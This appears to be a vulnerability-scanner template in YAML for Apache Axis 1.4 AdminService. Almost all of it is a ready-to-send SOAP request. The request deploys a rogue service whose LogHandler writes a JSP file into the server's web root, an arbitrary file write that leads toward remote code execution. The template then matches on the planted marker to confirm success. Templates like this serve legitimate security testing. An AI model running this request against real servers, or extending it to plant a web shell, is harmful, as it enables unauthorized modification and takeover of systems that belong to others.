tmp/remote_code_execution/AxisRCE-Req1.yaml

id: custom-axis-admin-service-exploit

info:
  name: Axis AdminService Arbitrary File Write Vulnerability
  author: rdnt
  severity: high
  description: Checks for an arbitrary file write vulnerability in Axis AdminService.
  reference:
    - http://www.bmth666.cn/2023/11/28/Apache-Axis1-4-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
  tags: axis,adminservice,arbitrary,file,write

requests:
  - method: POST
    path:
      - "{{BaseURL}}/axis/services/AdminService"

    headers:
      Content-Type: "text/xml; charset=utf-8"
      SOAPAction: ""

    body: |
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
        <soap:Body>
          <deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
              <service name="randomAAA" provider="java:RPC">
              <requestFlow>
                  <handler type="java:org.apache.axis.handlers.LogHandler" >
                      <parameter name="LogHandler.fileName" value="../webapps/ROOT/ABCDEF.jsp" />
                      <parameter name="LogHandler.writeToConsole" value="false" />
                  </handler>
              </requestFlow>
                <parameter name="className" value="java.util.Random" />
                <parameter name="allowedMethods" value="*" />
              </service>
          </deployment>
        </soap:Body>
      </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "ABCDEF"
        part: body

      - type: status
        status:
          - 200
